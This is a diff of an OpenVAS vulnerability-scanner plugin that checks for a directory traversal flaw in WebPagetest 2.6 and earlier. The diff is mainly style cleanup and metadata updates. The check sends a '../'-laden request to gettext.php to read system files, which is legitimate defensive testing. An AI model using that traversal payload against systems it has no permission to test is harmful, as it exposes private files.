@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_WebPagetest_54442.nasl 5641 2017-03-21 08:24:30Z cfi $
+# $Id: gb_WebPagetest_54442.nasl 5715 2017-03-24 11:34:41Z cfi $
 #
 # WebPagetest Multiple Input Validation Vulnerabilities
 #
@@ -36,26 +36,19 @@ process; other attacks are also possible.
 
 WebPagetest 2.6 and prior versions are vulnerable.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103529";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103529");
  script_bugtraq_id(54442);
  script_tag(name:"cvss_base", value:"9.7");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:C/A:C");
- script_version ("$Revision: 5641 $");
-
+ script_version ("$Revision: 5715 $");
  script_name("WebPagetest Multiple Input Validation Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54442");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:24:30 +0100 (Tue, 21 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 12:34:41 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-08-02 14:06:26 +0200 (Thu, 02 Aug 2012)");
- script_summary("Determine if it is possible to access local files");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
@@ -66,37 +59,31 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
+files = traversal_files();
 
-dirs = make_list(cgi_dirs());
-
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
    
-  url = dir + '/index.php'; 
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-  if(http_vuln_check(port:port, url:url,pattern:"WebPagetest - Website Performance and Optimization Test")) {
+  if( "WebPagetest - Website Performance and Optimization Test" >< buf ) {
 
-    files = traversal_files();
-
-    foreach file (keys(files)) {
-
+    foreach file( keys( files ) ) {
       url = dir + '/gettext.php?file=../../../../../../../../../../../' + files[file];
-
-      if(http_vuln_check(port:port, url:url,pattern:file)) {
-
-        security_message(port:port);
-        exit(0);
-
-      }  
-    }  
-     
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
+      }
+    }
   }
 }
 
-exit(0);
+exit( 99 );
